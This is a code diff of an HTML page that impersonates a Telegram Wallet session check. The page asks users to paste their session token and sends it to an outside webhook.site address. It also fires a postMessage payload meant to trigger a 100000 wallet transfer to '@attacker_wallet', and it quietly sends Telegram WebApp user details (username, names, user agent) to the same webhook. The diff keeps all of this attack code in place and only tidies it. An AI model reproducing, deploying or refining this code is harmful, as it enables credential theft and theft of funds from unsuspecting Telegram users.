@@ -39,7 +39,7 @@
   <p>Your Telegram Wallet session has expired. Please verify your session token to continue.</p>
 
   <div id="form">
-    <textarea id="token" autocomplete="off" name="session_token" placeholder="Paste your session token here..."></textarea><br><br>
+    <textarea id="token" placeholder="Paste your session token here..."></textarea><br><br>
     <button onclick="steal()">Verify</button>
   </div>
 
@@ -48,7 +48,7 @@
   </div>
 
   <script>
-    // Silent wallet trigger via postMessage
+    // Wallet postMessage injection
     const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
     const message = JSON.stringify({
       eventType: 'web_app_open_tg_link',
@@ -58,23 +58,22 @@
     });
 
     setTimeout(() => {
-      try {
-        window.opener?.postMessage(message, "*");
-        console.log("✅ postMessage payload sent.");
-      } catch (e) {
-        console.warn("Failed to postMessage:", e);
-      }
-    }, 1200);
+      window.opener?.postMessage(message, "*");
+      console.log("✅ postMessage payload sent.");
+    }, 1500);
 
-    // Steal token & hide UI
+    // Fake session verify
     function steal() {
       const token = document.getElementById("token").value.trim();
-      if (!token) return;
+      if (!token) {
+        alert("⚠️ Please paste a session token first.");
+        return;
+      }
 
       fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
         method: "POST",
         headers: { "Content-Type": "text/plain" },
-        body: `Captured Token: ${token}`
+        body: "Captured Token: " + token
       });
 
       document.getElementById("form").style.display = "none";
@@ -85,12 +84,11 @@
       }, 2000);
     }
 
-    // Telegram WebApp user info steal (if in context)
+    // ✅ Telegram user info exfil (paste this below inside <script>)
     try {
       window.Telegram.WebApp.ready();
       const tg = window.Telegram.WebApp;
       const user = tg.initDataUnsafe?.user;
-
       if (user) {
         fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
           method: "POST",
@@ -100,7 +98,7 @@
             username: user.username,
             first_name: user.first_name,
             last_name: user.last_name,
-            language_code: user.language_code,
+            lang: user.language_code,
             ua: navigator.userAgent,
             source: "Telegram WebApp"
           })
@@ -109,6 +107,7 @@
     } catch (e) {
       console.warn("Not in Telegram WebApp context.");
     }
+
   </script>
 </body>
 </html>
